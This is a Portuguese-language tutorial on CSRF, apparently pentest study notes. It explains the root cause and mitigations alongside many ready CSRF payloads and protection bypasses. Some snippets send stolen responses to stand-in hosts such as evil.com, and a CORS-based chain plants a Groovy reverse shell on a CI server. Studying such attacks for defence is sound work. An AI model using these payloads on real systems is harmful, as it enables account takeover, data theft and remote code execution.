---
title: "CSRF"
---

# CSRF - Cross-Site Request Forgery

## A Falha: Browser Envia Credenciais Automaticamente Sem Verificar Origem

CSRF existe porque o browser foi projetado com um comportamento que parece útil mas é perigoso num contexto de segurança: cookies são enviados automaticamente em toda requisição para o domínio correspondente, independente de quem iniciou aquela requisição. A aplicação web recebe uma requisição com o cookie de sessão válido e assume que aquela ação foi intencional — mas o cookie pode ter chegado porque o usuário estava numa página maliciosa que disparou a requisição sem o seu conhecimento.

A suposição de design errada é que "se o cookie está presente, a ação é legítima". Isso confunde autenticação (quem é o usuário) com autorização (o usuário realmente quis fazer isso agora). Um cookie prova que o browser pertence a um usuário autenticado. Não prova que o usuário clicou um botão ou preencheu um formulário. A presença do cookie é necessária mas não suficiente para garantir que a ação foi intencional.

O desenvolvedor cria essa falha simplesmente não adicionando nenhuma proteção além da autenticação via cookie — o que é o comportamento padrão da maioria dos frameworks sem configuração explícita. A aplicação funciona corretamente para usuários normais (que fazem ações pela interface), então a vulnerabilidade nunca aparece em testes funcionais. Só se manifesta quando uma requisição é forjada por um terceiro.

A consequência real antes de ver a exploração: qualquer ação state-changing que a aplicação oferece — transferir dinheiro, mudar email, promover usuário, deletar conta — pode ser executada sem o consentimento do usuário autenticado, bastando fazer aquele usuário visitar uma página maliciosa enquanto tem sessão ativa na aplicação alvo.

---

## Causa Raiz

O código vulnerável não distingue se a requisição foi iniciada pelo usuário na aplicação ou forjada por um terceiro:

```python
# VULNERÁVEL — valida apenas autenticação, não origem da ação
@app.route('/change-email', methods=['POST'])
def change_email():
    if not session.get('user_id'):
        return redirect('/login')
    
    new_email = request.form['email']
    db.update_email(session['user_id'], new_email)
    return "Email atualizado"
    # Não verifica se a requisição veio do formulário legítimo!
```

O que está faltando é verificação de que a requisição foi iniciada pela própria aplicação. O padrão correto usa CSRF tokens: um valor aleatório e imprevisível incluído em cada formulário, armazenado na sessão, e verificado no server antes de processar a ação:

```python
# SEGURO — CSRF token verifica que a requisição veio do formulário legítimo
@app.route('/change-email', methods=['POST'])
def change_email():
    if not session.get('user_id'):
        return redirect('/login')
    
    # Verificar que o token enviado corresponde ao token da sessão
    if request.form.get('csrf_token') != session.get('csrf_token'):
        abort(403)
    
    new_email = request.form['email']
    db.update_email(session['user_id'], new_email)
    return "Email atualizado"
```

O token CSRF funciona como prova de que o formulário foi obtido da mesma origem da aplicação — um atacante não consegue forjar um formulário com o token correto porque não tem acesso à sessão do usuário (Same-Origin Policy impede leitura cross-origin). O que está faltando na versão vulnerável é qualquer mecanismo que prove que a requisição foi iniciada pelo usuário na aplicação legítima.

---

## O Browser Como Vetor: Cookies Automáticos e Requisições Cross-Origin

### O Mecanismo do CSRF

O CSRF explora dois comportamentos do browser:

1. **Cookies são enviados automaticamente** em todas as requisições para o domínio correspondente
2. **Requisições cross-origin são permitidas** para certos tipos de conteúdo (forms, imagens, scripts)

```
[Vítima logada em bank.com]
     ↓
[Vítima visita evil.com]
     ↓
[evil.com tem HTML que faz POST para bank.com/transfer]
     ↓
[Browser da vítima envia a requisição COM os cookies de bank.com]
     ↓
[bank.com processa a transferência como se fosse a vítima]
```

### Pré-requisitos para um CSRF Bem-Sucedido

1. **Sessão via cookie**: a autenticação deve usar cookie (não Authorization header)
2. **Sem CSRF token** (ou token bypassável)
3. **SameSite não é Strict** (Lax permite GET, None permite tudo)
4. **Ação state-changing**: algo que modifica dados no servidor

### Same-Origin Policy (SOP)

A SOP é o mecanismo do browser que impede JavaScript de ler respostas de origens diferentes. A origem é definida por: `scheme + host + port`.

Exemplos:
- `http://example.com` e `https://example.com` → **origens diferentes** (scheme diferente)
- `https://app.example.com` e `https://api.example.com` → **origens diferentes** (host diferente)
- `https://example.com` e `https://example.com:8443` → **origens diferentes** (port diferente)
- `https://example.com` e `https://example.com:443` → **mesma origem** (443 é padrão do HTTPS)

**Importante**: A SOP impede a **leitura** da resposta, mas não impede o **envio** da requisição. Isso é o que torna CSRF possível - o browser envia a requisição, o servidor executa a ação, e mesmo que o JavaScript do atacante não possa ler a resposta, o dano já foi feito.

---

## Discovery

### Identificando Endpoints Vulneráveis a CSRF

```bash
# 1. Mapear todas as ações state-changing
# Procurar: POST forms, PUT/DELETE requests, operações que modificam dados

# 2. Verificar presença de CSRF token nos forms
# F12 → Elements → procurar inputs hidden com nome csrf, _token, etc.

# 3. Verificar SameSite do cookie de sessão
# F12 → Application → Cookies → verificar coluna SameSite

# 4. Verificar headers CORS nas respostas
curl -s -I -X OPTIONS https://target.com/api/action \
  -H "Origin: https://evil.com" | grep -i "access-control"
```

### Verificação com Burp Suite

1. Navegar na aplicação logado
2. Executar uma ação (ex: mudar email)
3. No HTTP History, clicar com botão direito → Engagement tools → Generate CSRF PoC
4. Burp gera automaticamente o HTML do PoC

---

## Exploitation

### PoC Básico - HTML Form Auto-Submit

```html
<!-- CSRF via POST -->
<html>
  <body>
    <form method="POST" action="https://target.com/change-email">
      <input name="email" value="attacker@evil.com">
      <input type="submit">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

```html
<!-- CSRF via GET - ainda mais simples -->
<!-- Imagem que dispara uma ação GET -->
<img src="https://target.com/delete?id=123" style="display:none">

<!-- Link que dispara via GET -->
<a href="https://target.com/promote?user=attacker">Click here for prize</a>

<!-- Script que redireciona para ação GET -->
<script>
document.location = "https://target.com/promote?user=attacker";
</script>
```

### CSRF via XMLHttpRequest (sem leitura de resposta)

```javascript
// Em XSS ou site controlado pelo atacante
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://target.com/change-email', false);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('email=attacker@evil.com');
```

### CSRF via Fetch API

```javascript
// Usando Fetch API - mais moderno
const response = await fetch('http://target.com/change-email', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'email=attacker@evil.com',
    credentials: 'include'  // Inclui cookies!
});
```

### CSRF com JSON Body

Muitas APIs modernas aceitam apenas `application/json`. É possível explorar se:

```html
<!-- Método 1: Se a API não valida Content-Type -->
<html>
  <body>
    <form method="POST"
          action="http://target.com/api/update"
          enctype="text/plain">
      <!-- name='{"email": "attacker@evil.com", "dummy_key' value='": "dummy_value"}' -->
      <!-- Resulta em body: {"email": "attacker@evil.com", "dummy_key": "dummy_value"} -->
      <input type="hidden"
             name='{"email": "attacker@evil.com", "dummy_key"'
             value='": "dummy_value"}' />
      <input type="submit">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

O body enviado será:
```
{"email": "attacker@evil.com", "dummy_key": "dummy_value"}
```

Com `Content-Type: text/plain` - se a aplicação só valida o formato do JSON mas não o Content-Type, funciona.

### Entrega do Payload

```html
<!-- Página completa de entrega de CSRF -->
<!DOCTYPE html>
<html>
<head>
    <title>Você ganhou um prêmio!</title>
</head>
<body>
    <!-- CSRF invisible -->
    <img src="http://target.com/promote?user=attacker" 
         style="width:0;height:0;border:0;">
    
    <!-- Ou form auto-submit -->
    <form id="csrf-form" method="POST" action="http://target.com/change-password" 
          style="display:none">
        <input name="password" value="hacked123">
        <input name="confirm_password" value="hacked123">
    </form>
    
    <script>
        // Submete automaticamente após 1 segundo para não parecer suspicious
        setTimeout(function() {
            document.getElementById('csrf-form').submit();
        }, 1000);
    </script>
    
    <h1>Parabéns! Clique aqui para resgatar seu prêmio</h1>
</body>
</html>
```

---

## Bypass de Proteções CSRF

### 1. Token Não Validado Server-Side

O mais simples: remover o token da requisição e ver se funciona.

```bash
# Requisição original (bloqueada sem token)
POST /change-email HTTP/1.1
Host: target.com

email=victim@target.com&csrf_token=abc123xyz

# Teste: remover o token completamente
POST /change-email HTTP/1.1
Host: target.com

email=attacker@evil.com

# Se funcionar → aplicação não valida o token server-side!
```

### 2. Token Não Vinculado à Sessão

Se um token de CSRF de outra sessão é aceito:

```bash
# Obter um token válido com sua própria conta
GET /profile HTTP/1.1
Cookie: session=ATTACKER_SESSION
→ csrf_token=ATTACKER_TOKEN

# Usar esse token com a sessão da vítima (via CSRF)
POST /change-email HTTP/1.1
# A vítima envia com SEU token mas a SESSÃO da vítima

email=attacker@evil.com&csrf_token=ATTACKER_TOKEN
```

PoC HTML:
```html
<form method="POST" action="https://target.com/change-email">
    <input name="email" value="attacker@evil.com">
    <!-- Token obtido do atacante, não da vítima -->
    <input name="csrf_token" value="ATTACKER_TOKEN">
</form>
<script>document.forms[0].submit();</script>
```

### 3. Extração de Token via XSS (CSRF + XSS Chain)

Se há XSS no domínio, pode-se ler o CSRF token do DOM:

```javascript
// Payload XSS que extrai CSRF token e faz CSRF
var xhr = new XMLHttpRequest();
xhr.open('GET', '/profile', false);  // síncrono para simplicidade
xhr.withCredentials = true;
xhr.send();

// Parsear o HTML da resposta para extrair o CSRF token
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

// Usar o token para fazer a requisição CSRF
var csrf_req = new XMLHttpRequest();
var params = 'promote=victim_user&csrf=' + csrftoken;
csrf_req.open('POST', 'https://target.com/profile.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

### 4. Duplicate Cookie Bypass

Se o CSRF token é simplesmente comparado ao valor de um cookie:

```bash
# Se o servidor compara: csrf_token (form) == csrf_cookie (cookie)
# E o atacante pode definir cookies (ex: via subdomínio)

# Definir cookie do domínio principal via subdomínio comprometido
document.cookie = "csrf_cookie=attacker_value; domain=.target.com";

# Agora no CSRF, enviar esse mesmo valor no campo do form
```

### 5. Bypass de Proteção via Referer Header

```bash
# Proteção baseada em Referer: verifica se começa com target.com
# Bypass: hospedar payload em URL que contém target.com

# Se verifica apenas prefixo/sufixo:
http://target.com.evil.com/payload.html
http://evil.com/target.com/payload.html

# Se verifica apenas presença da string:
http://evil.com/path?ref=target.com

# Burp: pode remover o Referer com Match & Replace:
# Match: "Referer: .*\n"  Replace: ""
```

### 6. Token Fraco / Previsível (Brute Force)

```bash
# Coletar múltiplos tokens e analisar o padrão
# Se for Unix Timestamp:

# Obter vários tokens e observar o padrão
GET /profile → csrf_token=1692981700
GET /profile → csrf_token=1692981703

# Os tokens são timestamps! Adivinhar o timestamp atual
# e hardcodar no payload CSRF

# HTML com token hardcoded
<form method="GET" action="http://target.com/profile.php">
    <input type="hidden" name="promote" value="attacker">
    <input type="hidden" name="csrf" value="1692981700">
    <input type="submit" value="Submit">
</form>
<script>document.forms[0].submit();</script>
```

---

## SameSite Cookie Attribute

### Como Funciona

O atributo `SameSite` controla quando cookies são enviados em requisições cross-site:

| Valor | Comportamento | Risco CSRF |
|-------|--------------|-----------|
| `Strict` | Cookie NUNCA enviado cross-site | Proteção máxima |
| `Lax` | Cookie enviado em GET top-level, não em POST cross-site | Proteção parcial |
| `None` | Cookie sempre enviado (requer Secure) | Sem proteção |

**Padrão atual**: Chrome aplica `Lax` por padrão se nenhum SameSite for definido (desde Chrome 80, 2020).

### Bypass de SameSite=Lax

Lax permite GET requests de top-level navigation. Se a ação state-changing usa GET:

```html
<!-- Funciona contra SameSite=Lax se o endpoint aceita GET -->
<script>
document.location = "https://target.com/promote?user=attacker";
</script>
```

### Bypass de SameSite=Strict via Client-Side Redirect

SameSite=Strict não envia cookies em nenhuma requisição cross-site. Porém, se o site tem um endpoint que faz **redirect client-side** (não 3xx, mas JavaScript/meta refresh), podemos explorar isso:

```html
<!-- 1. Vítima visita nosso payload -->
<script>
// 2. Redirecionamos para um endpoint no site que faz client-side redirect
// O redirect é "SameSite" porque parte do próprio site
document.location = "http://target.com/admin.php?user=htb-stdnt&promote=attacker";
</script>
```

Se `admin.php` tem `<meta http-equiv="refresh" content="3; url=/profile.php?user=attacker">`, o browser considera essa segunda requisição como "SameSite" e envia os cookies - mesmo sendo Strict.

**Nota**: Funciona apenas com client-side redirects (JavaScript, meta refresh), NÃO com server-side redirects (3xx HTTP).

### Bypass via XSS em Subdomínio

Subdomínios são considerados "SameSite". Se `sub.target.com` tem XSS:

```javascript
// XSS em guestbook.target.com
// Esse código é considerado "SameSite" pelo browser
// Portanto cookies SameSite=Strict são enviados!

var csrf_req = new XMLHttpRequest();
var params = 'promote=attacker';
csrf_req.open('POST', 'http://target.com/profile.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

---

## CORS como Vetor de CSRF

### Misconfiguração 1: Wildcard Origin com Credenciais

**Impossível por spec**: `Access-Control-Allow-Origin: *` não pode ser combinado com `Access-Control-Allow-Credentials: true`. O browser bloqueia isso.

### Misconfiguração 2: Reflexão Arbitrária de Origin

Se o servidor reflete qualquer `Origin` no header:

```bash
# Teste: enviar origem arbitrária
curl -s -I https://target.com/api/data \
  -H "Origin: https://evil.com" | grep "Access-Control"

# Resposta vulnerável:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

Exploit:
```javascript
// Agora podemos ler a resposta cross-origin!
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://api.target.com/data', true);
xhr.withCredentials = true;
xhr.onload = () => {
    location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
};
xhr.send();
```

### Misconfiguração 3: Whitelist de Origin por Sufixo

```bash
# Servidor confia em qualquer origin que termina com target.com
# Atacante usa:
https://attackertarget.com  # termina com target.com!

# Ou prefix check mal implementado
https://target.com.evil.com  # começa com target.com!
```

### Bypass de CSRF Token via CORS + XSS

```javascript
// 1. Fazer requisição GET autenticada para obter CSRF token
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/profile.php', false);
xhr.withCredentials = true;
xhr.send();

// 2. Parsear o token da resposta
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

// 3. Usar o token para fazer a requisição protegida
var csrf_req = new XMLHttpRequest();
var params = 'promote=attacker&csrf=' + csrftoken;
csrf_req.open('POST', 'https://target.com/profile.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

---

## Cross-Site WebSocket Hijacking (CSWSH)

WebSockets não seguem a SOP da mesma forma. Uma conexão WebSocket pode ser iniciada cross-origin sem proteção CSRF por padrão:

```javascript
// Atacante abre WebSocket para o servidor da vítima
var ws = new WebSocket('wss://target.com/chat');

ws.onopen = function() {
    // Browser envia cookies de target.com automaticamente no upgrade
    ws.send('{"action": "getUserData"}');
};

ws.onmessage = function(msg) {
    // Exfiltrar dados recebidos
    fetch('https://evil.com/steal?data=' + btoa(msg.data));
};
```

---

## ClickJacking

ClickJacking usa iframes para fazer a vítima clicar em algo que não está vendo:

```html
<!-- Iframe transparente sobre botão falso -->
<style>
    iframe {
        opacity: 0.0;
        position: absolute;
        top: 0; left: 0;
        width: 100%; height: 100%;
        z-index: 2;
    }
    #fake-button {
        position: absolute;
        top: 300px; left: 200px;
        z-index: 1;
    }
</style>

<button id="fake-button">Clique aqui para ganhar!</button>
<iframe src="https://target.com/profile"></iframe>
```

**Proteções:**
- `X-Frame-Options: DENY` - não pode ser em iframe
- `X-Frame-Options: SAMEORIGIN` - apenas mesmo origin
- `Content-Security-Policy: frame-ancestors 'none'` - mais moderno e flexível

**Bypass**: `X-Frame-Options` não tem bypass. `CSP frame-ancestors` também não. Porém aplicações sem esses headers são completamente vulneráveis.

---

## Ferramentas

### Burp Suite - CSRF PoC Generator

```
1. Interceptar uma requisição state-changing
2. Botão direito → Engagement tools → Generate CSRF PoC
3. Burp gera HTML automaticamente
4. "Test in browser" para testar localmente
5. Ajustar o HTML gerado para o cenário específico
```

### Manual com curl

```bash
# Simular um CSRF request
curl -s -X POST https://target.com/change-email \
  -H "Referer: https://evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "session=VICTIM_SESSION_COOKIE" \
  -d "email=attacker@evil.com"

# Verificar se CSRF token é validado
curl -s -X POST https://target.com/change-email \
  -b "session=VICTIM_SESSION_COOKIE" \
  -d "email=attacker@evil.com"
  # Sem csrf_token → se funcionar, não há proteção
```

---

## Detecção e Mitigação

### Checklist de Vulnerabilidade CSRF

```
[ ] Ação muda estado no servidor (não só leitura)
[ ] Autenticação via cookie (não Authorization header)
[ ] Sem CSRF token, ou token presente mas não validado
[ ] SameSite não é Strict (ou é Lax mas ação aceita GET)
[ ] Origin/Referer não verificados (ou verificação bypassável)
[ ] Cookie não tem SameSite=Strict
```

### Verificar Token

```bash
# 1. Fazer a ação normal e capturar a requisição
# 2. Remover o csrf_token e reenviar
# 3. Se funcionar = token não validado

# 4. Substituir o token por outro inválido
# 5. Se funcionar = token não validado

# 6. Usar o próprio token em outra sessão
# 7. Se funcionar = token não vinculado à sessão
```

### Mitigação

A proteção efetiva contra CSRF combina múltiplas camadas:

1. **CSRF Token**: valor aleatório, imprevisível, vinculado à sessão, verificado server-side em cada mutação
2. **SameSite=Strict**: impede envio de cookies em qualquer requisição cross-site, proteção mais robusta para ações sensíveis
3. **Verificação de Origin/Referer**: camada adicional para rejeitar requisições cross-origin em endpoints sensíveis
4. **Double Submit Cookie**: token igual no cookie e no body, útil para aplicações stateless

Para CSRF puro (sem XSS), `SameSite=Strict` nos cookies de sessão é a proteção mais efetiva e simples de implementar. Para proteção completa, combinar com tokens CSRF nas ações state-changing.

---

## Resumo dos Payloads

```html
<!-- ===== CSRF BÁSICO POST ===== -->
<form method="POST" action="https://target.com/action">
  <input name="param" value="malicious_value">
</form>
<script>document.forms[0].submit();</script>

<!-- ===== CSRF VIA GET ===== -->
<img src="https://target.com/delete?id=123" width="0" height="0">

<!-- ===== CSRF INVISÍVEL ===== -->
<iframe src="https://target.com/action?param=value"
        style="display:none"></iframe>

<!-- ===== CSRF COM JSON (sem Content-Type correto) ===== -->
<form method="POST" action="https://target.com/api"
      enctype="text/plain">
  <input name='{"key": "value", "dummy"' value='": "x"}'>
</form>
<script>document.forms[0].submit();</script>

<!-- ===== XSS → CSRF (lê token e executa ação) ===== -->
<script>
var r = new XMLHttpRequest();
r.open('GET', '/profile', false);
r.withCredentials = true;
r.send();
var doc = new DOMParser().parseFromString(r.responseText, 'text/html');
var token = doc.getElementById('csrf').value;
var r2 = new XMLHttpRequest();
r2.open('POST', '/change-email', false);
r2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
r2.withCredentials = true;
r2.send('email=attacker@evil.com&csrf=' + token);
</script>

<!-- ===== SAMESITE=STRICT BYPASS via redirect ===== -->
<script>
document.location = "http://target.com/admin?user=victim&promote=attacker";
</script>
```

---

---

## CORS Origin Reflection + CSRF → RCE via Workflow Server (AWAE Ch.11)

### Conceito da Cadeia

Duas misconfigurações combinadas:
1. **CORS reflection**: servidor reflete `Origin` arbitrário em `Access-Control-Allow-Origin` + `Access-Control-Allow-Credentials: true` → qualquer domínio pode LER respostas autenticadas
2. **Multipart preflight bypass**: `Content-Type: multipart/form-data` é "simple request" — não dispara OPTIONS preflight, então restrições CORS adicionais não são checadas

Juntos permitem: exfiltrar dados autenticados E executar ações POST com a sessão da vítima, a partir de qualquer site externo.

### Detecção de CORS Reflection

```bash
# adicionar header Origin e verificar se é refletido
curl -si -H "Origin: https://evil.com" https://TARGET/api/v1/process \
  | grep -i "access-control"

# resposta crítica:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

### Bypass de Preflight via Multipart

```
# dispara OPTIONS preflight (CORS bloqueia cross-origin):
Content-Type: application/json

# simple request — sem preflight, sem validação adicional:
Content-Type: multipart/form-data; boundary=...
```

### Cadeia RCE — Concord Workflow Server

Concord é um servidor de CI/CD que aceita upload de arquivo `concord.yml` com workflow Groovy:

```javascript
// payload.js — hospedado em evil.com
// Etapa 1: confirmar que vítima está autenticada
fetch('https://TARGET/api/v1/whoami', {credentials: 'include'})
  .then(r => r.json())
  .then(user => {
    if (user.username) uploadWorkflow();
  });

// Etapa 2: construir YAML com Groovy reverse shell
function uploadWorkflow() {
  const yaml = `
configuration:
  dependencies:
    - mvn://org.codehaus.groovy:groovy-all:pom:2.5.21
flows:
  default:
    - script: groovy
      body: |
        def s = new Socket("ATTACKER", PORT)
        def p = ["bash","-i"].execute()
        p.consumeProcessOutput(s.outputStream, s.outputStream)
        p.waitFor()
`;

  // Etapa 3: upload multipart (sem preflight)
  const blob = new Blob([yaml], {type: 'text/plain'});
  const form = new FormData();
  form.append('concord.yml', blob, 'concord.yml');

  fetch('https://TARGET/api/v1/process', {
    method: 'POST',
    body: form,
    credentials: 'include'   // envia cookies da vítima
  });
}
```

### Groovy Reverse Shell — Estrutura

```groovy
// Estrutura do shell em Groovy (ProcessBuilder + Socket)
def host = "ATTACKER"
def port = 4444
def s = new Socket(host, port)
def p = new ProcessBuilder(["/bin/sh"]).redirectErrorStream(true).start()
// pipe bidirecional processo ↔ socket
p.consumeProcessOutput(s.outputStream, s.outputStream)
p.waitFor()
```

### Variações

A cadeia funciona em qualquer servidor que aceite upload de script com execução automática:
- Jenkins: upload de Jenkinsfile via API
- GitLab CI: criação de pipeline via API com `.gitlab-ci.yml`
- Qualquer CI/CD que permita definir steps com código arbitrário

---

## Módulos Relacionados

O módulo [`01_xss_fundamentos.md`](01_xss_fundamentos.md) cobre XSS como vetor para extrair CSRF tokens e encadear ataques — a combinação XSS+CSRF permite contornar proteções de token quando há XSS na mesma origem. Técnicas avançadas de XSS+CSRF chaining e bypass de SameSite estão detalhadas em [`02_xss_avancado_e_filter_bypass.md`](02_xss_avancado_e_filter_bypass.md). Para o tema de CORS origin reflection, que frequentemente aparece em contextos de CSRF com credenciais, consulte [`../10_http_attacks/02_http_misconfigs.md`](../10_http_attacks/02_http_misconfigs.md).
